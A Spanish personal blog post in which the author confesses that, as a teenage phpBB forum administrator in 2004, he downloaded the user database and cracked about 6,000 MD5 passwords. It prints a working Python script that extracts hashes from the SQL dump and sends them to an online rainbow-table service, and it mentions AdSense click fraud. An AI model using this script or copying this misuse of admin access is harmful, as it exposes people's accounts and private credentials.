---
layout: post
title: Ensuciándome las manos en 2004
categories: [programming]
published: True
featured: true
date: 2012-09-17
category: Personal
markdown: markdown
image: /images/uploads/posts/hands-dirty/security_cameras.jpg
image_credit: Photo by <a href="https://unsplash.com/@scottwebb?utm_source=unsplash&utm_medium=referral&utm_content=creditCopyText">Scott Webb</a>
excerpt: En 2004, entre clases de instituto y partidas de Age of Empires, me topé con una base de datos de 20.000 usuarios con contraseñas MD5.
---
Si soy curioso ahora, lo era mucho más con 14 o 15 años. En aquella época me defendía bien con PHP, hacía mis pinitos con C, y empezaba a trastear con Python. La mitad del día lo pasaba en canales de IRC-Hispano, mayormente en canales de programación (#php_para_torpes, #python, etc) y Age of Empires (#aoc, #the_conquerors). Pasaba muchas horas y era muy activo, por lo que con los años acabé haciendo mi pequeña comunidad de ciber-amigos. Algunos de ellos programaban y montaban o gestionaban páginas o proyectos conocidos ([PHP_Hispano](http://www.php-hispano.net/) entre otros). 

Un día, me invitaron a *selecto* grupo privado donde se organizaban para aprovecharse de fallas del sistema de publicidad de Google: Adsense. Todos éramos bloggers (o webloggers por aquella época) y teníamos anuncios en nuestras páginas, y estos cafres habían montado un sistema semi-automático para pincharnos en las publicidades de unos a otros todos los días de una forma que aún Google no era capaz de filtrar. Cada día, mis anuncios recibían 12 clicks. Y así estuvimos 2 años. Al cabo de unos meses con el dinero conseguido, jubilé mi [Pentium 3 866Mhz](http://www.cpu-world.com/CPUs/Pentium-III/Intel-Pentium%20III%20866%20-%20RB80526PZ866256%20(BX80526C866256%20-%20BX80526C866256E).html) y 64Mb de RAM por un [AMD Athlon 3400+](http://www.cpu-world.com/CPUs/K8/AMD-Athlon%2064%203400+%20-%20ADA3400DAA4BZ.html) con 1Gb y en una caja chulísima, con luces de colores. Era 2004 y había ganado mis primeros 1.000€. 

También en aquel entonces, un chalado de este grupo que trabajaba para Motorola nos dió acceso ilimitado a un software interno en estado de pruebas con el que podíamos hacer llamadas a todo el mundo de forma gratuita. Obviamente lo usamos con fines maléficos y acabamos asustando mucho a la madre de un compañero puertoriqueño de #php_para_torpes. 

Total, que uno de estos contactos era un tío que había montado la primera plataforma de música en streaming de España, y lo estaba petando mucho. Solo en el primer par de meses había conseguido más de 20.000 usuarios registrados y no paraba de ampliar servidores para aguantar la carga de tráfico. Tenía un foro [phpBB](https://www.phpbb.com/) que iba a toda pastilla y necesitaba que alguien se lo gestionara: aquí entro yo. De repente, era administrador de una de las páginas del momento en España. Lo estaba flipando un poco trasteando por el panel de administración cuando me encontré con la gestión de Backups. No me pude aguantar... y descargué el backup de la base de datos. 

Estaba un poco asustado. Quería husmear, pero me daba cosilla. Pensé que si abría los ficheros .sql con notepad era menos malo que si hacía todo el esfuerzo de montarme una base de datos local y cargar el dump: eso ya sería premeditado, oye. Cuando abrí el dump de 20Mb con `gedit` me petó el ordenador. Ni Athlon 3400+ ni hostias. Tuve que abrirlo con `nano` para encontrarme, entre otras cosas, 20.000 lineas como esta: 

{% highlight sql %}
INSERT INTO phpbb_users (user_id, user_active, username, user_password,
user_session_time, user_session_page, user_lastvisit, user_regdate,
user_level, user_posts, user_timezone, user_style, user_lang,
user_dateformat, user_new_privmsg, user_unread_privmsg,
user_last_privmsg, user_login_tries, user_last_login_try, user_emailtime,
user_viewemail, user_attachsig, user_allowhtml, user_allowbbcode,
user_allowsmile, user_allowavatar, user_allow_pm, user_allow_viewonline,
user_notify, user_notify_pm, user_popup_pm, user_rank, user_avatar,
user_avatar_type, user_email, user_icq, user_website, user_from, user_sig,
user_sig_bbcode_uid, user_aim, user_yim, user_msnm, user_occ,
user_interests, user_actkey, user_newpasswd) VALUES('4', '1', '[USERNAME]',
'87f6f9d078c3bc5db5578f3b4add9470', '2147483647', '0', '2147483647',
'2147483647', '0', '0', '0.00', '1', 'english', 'D M d, Y g:i a', '0',
'0', '0', '0', '0', NULL, '0', '1', '0', '1', '1', '1', '1', '1', '0',
'1', '1', '0', '', '0', '[USER_MAIL_ADDRESS]@hotmail.com', '', '', '', '', '', '',
'', '', '', '', '', NULL);
{% endhighlight %}
![](/images/uploads/posts/hands-dirty/kid_surprised.jpeg){:class="img-right"}

20.000 usuarios con sus direcciones de correos y sus contraseñas en MD5. No recuerdo si en 2005 aún alguien confiaba en MD5, pero os aseguro que no era para nada la mejor forma de guardar contraseñas. A parte del famoso [John The Ripper](https://www.openwall.com/john/), existían páginas como [GDataOnline](https://web.archive.org/web/20060718024011/http://gdataonline.com/) (ya difunta) que contenían millones de hashs MD5 y sus correspondientes orígenes ([Rainbow Tables](https://en.wikipedia.org/wiki/Rainbow_table)). Básicamente, tu buscabas un hash y te devolvía (si lo conocía) el texto original. Además, la página tenía *una especie de API rudimentaria* que devolvía XML. 

Como me estaba calentando, escribí un script que leía el fichero .sql y encontraba el email y contraseña encriptado de cada usuario usando expresiones regulares. A lo bestia. La cosa se fue (la fui) moviendo y obviamente acabé mandando peticiones a GDataOnline para traerme contraseñas limpitas. 

Cada paso que daba me daba un poco más de miedo y más me imaginaba a la policía pegando en la puerta. 

Al cabo de unas horas, acabé con esto:

{% highlight python %}
#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
import re
import urllib
import os

def getPasswords():
  successful_passwords = 0
  num = 1

  file = r"inputFile001" #Change this for every file
  text = open(file, "r")
  content = text.read()
  text.close()
  user = re.findall("VALUES.*?;", content)

  output_file = r"outputFile001" #Change this for every file
  foo = open(output_file, "w")

  spaces = " "*32
  foo.write("Nickname" + spaces + "Password" + spaces + "Mail" + "\r")
  foo.write('-' * 90 + "\r")

  for i in user:
    nickname = i.split()[2].strip(",").strip("'")
    mail = i.split()[39].strip(",").strip("'")

    f = urllib.urlopen("http://gdataonline.com/qkhash.php?mode=xml&amp;hash=%s" 
                          % i.split()[3].strip(",").strip("'"))
    xml = f.read()
    passwords = re.findall(".*?", xml)

    if passwords: # If we get the original
     password = passwords[0].split("").pop().split("")[0]
     successful_passwords +=1

    foo.write(nickname.ljust(40) + password.ljust(40) + mail.ljust(22))
    foo.write("\r")

    os.system("clear")
    print "Total: %i" % len(user)
    print "Analized: %i" % num
    print "Found: %i" % successful_passwords

    num += 1

  foo.close()
  print "%i passwords have been found" % successful_passwords

 if __name__ == '__main__':
   getPasswords()
{% endhighlight %}

Una delicia de código apoyado en todas las buenas prácticas de [Code Complete](https://www.amazon.com/Code-Complete-Practical-Handbook-Construction/dp/0735619670). Un orgullo. ¡Y lo mejor es que funcionaba! El código leía cada fichero de dump y, usando una expresión regular, identificaba todos usuarios. Luego iteraba sobre ellos, extraía el campo donde se encontraba la contraseña encriptada y la mandaba a GDataOnline. Si GDataOnline conocía la contraseña, me la devolvía y yo la escribía en un fichero junto con el username y el email: 

|**Nickname**|**Password**|**Mail**|
|juan|mipassword|juanito_perez@hotmail.com|
|miguel|12341234|the_big_boy@yahoo.com|
|admin|this_is_my_admin_password|admin@thissite.com|
|....|....|....|

Había conseguido el 30% de las contraseñas en texto plano... 6.000 pares de (email, contraseña) en una época en la que la gente ni siquiera sabía que era [2FA](https://en.wikipedia.org/wiki/Multi-factor_authentication). La probabilidad de que esos credenciales dieran acceso a correos electrónicos, redes sociales o cuentas bancarias era bastante altas. 

Al cabo de unos días de no poder dormir tranquilo, borré los dumps y el fichero final, pero guardé el script (*obra de arte*) hasta hoy. Durante años mantuve el secreto oculto y nunca lo comenté a nadie: a fin de cuentas, muchos de mis amigos estaban registrados en esa web y muy probablmente había descubierto sus contraseñas. 

Ahora ya lo sabeis. 